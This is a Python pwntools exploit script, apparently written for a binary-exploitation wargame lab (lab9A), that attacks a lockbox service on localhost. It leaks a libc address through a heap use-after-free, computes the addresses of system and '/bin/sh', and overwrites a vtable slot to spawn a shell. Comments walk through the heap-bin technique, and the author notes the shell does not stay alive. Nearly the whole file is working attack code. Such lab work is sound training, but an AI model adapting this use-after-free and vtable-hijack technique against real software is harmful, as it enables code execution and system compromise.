from pwn import * 

p = remote("127.0.0.1", 9941) 
#p = process("/levels/lab09/lab9A")

''' 
Primatives for interacting with the interface. 

open_lockbox: Option 1
add_item: Option 2
get_item: Option 3
destroy_lockbox: Option 4
'''
def open_lockbox(box_no, array_size):
    p.sendline('1') 
    p.sendline(str(box_no)) 
    p.sendline(str(array_size)) 

def add_item(box_no, number): 
    p.sendline('2') 
    p.sendline(str(box_no)) 
    p.sendline(str(number))

def get_item(box_no, index):
    p.sendline('3') 
    p.sendline(str(box_no)) 
    p.sendline(str(index)) 

    # Parsing the get call
    p.recvuntil('lockbox[')
    # Remove the bracket from the string
    index = int(p.recvuntil(']')[:-1])
    p.recvuntil('= ') 
    
    # Get the value at this slot in the array
    value = int(p.recvuntil('\n')) 
    return value 

def destroy_lockbox(box_no):
    p.sendline('4') 
    p.sendline(str(box_no)) 

# The third lockbox ends up having a pointer, to the heap, saved when an array is allocated. This allows for a heap leak at spot 0 in the array
def heap_leak():
    open_lockbox(0, 4) 
    open_lockbox(1, 4) 
    # Add system
    for i in range(4):
        add_item(0,i+1) 
        add_item(0,i+0x10)
    destroy_lockbox(0) 
    destroy_lockbox(1) 
    open_lockbox(2,4)
    open_lockbox(3,8) 
    open_lockbox(4,4) 
    #get_item(2,0) 

# Works without ASLR :( 
def testing():
    open_lockbox(0, 4) 
    open_lockbox(1, 4) 
    # Add system
    for i in range(10):
        add_item(0, 0xb7d5d191) 
        add_item(1, i + 1 + 10) 

    destroy_lockbox(0) 
    get_item(0,0xb7e7da25)

def program_leak():

    # Fast bin, small bin, fast bin, for the arrays allocation
    open_lockbox(0, 4) 
    open_lockbox(1, 16)
    open_lockbox(2,4) 

    # Destroy bin 1 in order to make this into an unsorted bin. Unsorted bins are a doubly linked list :) 
    # This doubly linked list has POINTERS to libc, giving us the ability to leak libc values.
    destroy_lockbox(1) 
    
    # Recreate the lockbox in order to get the vtable setup properly to call the gets function. 
    # This array will be allocated where the unsorted bin pointers are. 
    open_lockbox(1,4)  

    # Get the unsorted bin pointer 
    leak = get_item(1,0) 
    # Need to flip this value from negative to positive 
    leak = leak + 2 ** 32
    return leak 

# Attempts to pop a /bin/sh!
def pop_shell(system, bin_sh):
    open_lockbox(3, 4) 
    open_lockbox(4, 4) 
    # Add system
    for i in range(10):
        # The vtable call to find maps to slot 1 in array 3. 
        # But, this value must be divisible by 4. 
        # So, we do system +1, which moves ahead of pop ebp. 
        add_item(3, system + 1) 
        add_item(4, i + 1 + 10) 

    destroy_lockbox(3) 
    # The /bin/sh ends up being the third item on the stack during the call. We but the pointer for this as the call in order to get system to run /bin/sh
    get_item(3,bin_sh) 
    # For some reason, this will not stay alive :(  
    # I am not entirely sure why :( 
pause()

system_offset = 0x16a300
bin_sh_offset = 0x49a6c
# Leak the pointer for libc 
libc_leak = program_leak() 
print "LibC leak...", hex(libc_leak)
system = libc_leak - system_offset
bin_sh = libc_leak - bin_sh_offset 

print "System...", hex(system)
print "/bin/sh...", hex(bin_sh)
pop_shell(system, bin_sh)

p.interactive() 
